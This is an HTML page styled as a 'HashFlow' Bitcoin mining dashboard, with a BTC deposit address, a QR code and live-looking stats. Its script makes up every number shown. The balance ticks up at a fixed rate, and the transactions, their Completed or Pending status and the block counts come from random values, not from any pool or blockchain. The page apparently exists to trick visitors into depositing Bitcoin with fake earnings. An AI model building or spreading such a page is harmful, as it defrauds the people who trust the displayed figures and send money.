<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>HashFlow BTC Monitoring Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{margin:0;padding:0;font-family:Arial,sans-serif;background:#0b0f1a;color:white;}
.card{
  max-width:95%;
  margin:15px auto;
  padding:20px;
  border-radius:12px;
  background:#131a2e;
}
h2{color:#f2a900;text-align:center;}
.btc{
  font-size:28px;
  text-align:center;
  margin:10px 0;
}
.stats{
  display:flex;
  justify-content:space-around;
  flex-wrap:wrap;
}
.stats div{
  background:#0b0f1a;
  padding:10px;
  margin:5px;
  border-radius:8px;
}
.tx-container{
  max-height:260px;
  overflow:hidden;
  background:#0b0f1a;
  padding:10px;
  border-radius:8px;
  font-size:13px;
}
.tx{
  display:flex;
  justify-content:space-between;
  padding:4px 0;
  border-bottom:1px solid #222;
}
.green{color:#00ff99;}
.yellow{color:#ffcc66;}
.btc-box{
  background:#0b0f1a;
  padding:10px;
  border-radius:8px;
  word-break:break-all;
  text-align:center;
}
button{
  background:#f2a900;
  border:none;
  padding:10px 16px;
  border-radius:6px;
  font-weight:bold;
  cursor:pointer;
}
</style>
</head>
<body>

<div class="card">
  <h2>BTC Deposit Address</h2>
  <div class="btc-box">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
  <div style="text-align:center;margin-top:10px;">
    <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
  </div>
</div>

<div class="card">
  <h2>Monitoring Dashboard</h2>
  <div class="btc" id="balance">0.00000000 BTC</div>
  <div class="stats">
    <div>Hashrate: 120 TH/s</div>
    <div>Blocks: <span id="blocks">0</span></div>
    <div>Uptime: <span id="uptime">0h 0m</span></div>
  </div>
</div>

<div class="card">
  <h2>Recent Activity</h2>
  <div class="tx-container" id="txs"></div>
</div>

<script>
let balance = 0;
let blocks = 0;
let minutes = 0;
const txs = document.getElementById("txs");

setInterval(()=>{
  balance += 0.00000008;
  document.getElementById("balance").innerText = balance.toFixed(8)+" BTC";
},1000);

setInterval(()=>{
  const tx = document.createElement("div");
  tx.className="tx";
  const val = (Math.random()*0.0004+0.00002).toFixed(8);
  const status = Math.random()>0.5 ? "Completed" : "Pending";
  tx.innerHTML = `<span>+${val} BTC</span><span class="${status==="Completed"?"green":"yellow"}">${status}</span>`;
  txs.prepend(tx);
  if(txs.children.length>500) txs.removeChild(txs.lastChild);
},1500);

setInterval(()=>{
  blocks += Math.floor(Math.random()*2);
  minutes++;
  document.getElementById("blocks").innerText = blocks;
  document.getElementById("uptime").innerText =
    Math.floor(minutes/60)+"h "+(minutes%60)+"m";
},60000);
</script>

</body>
</html>
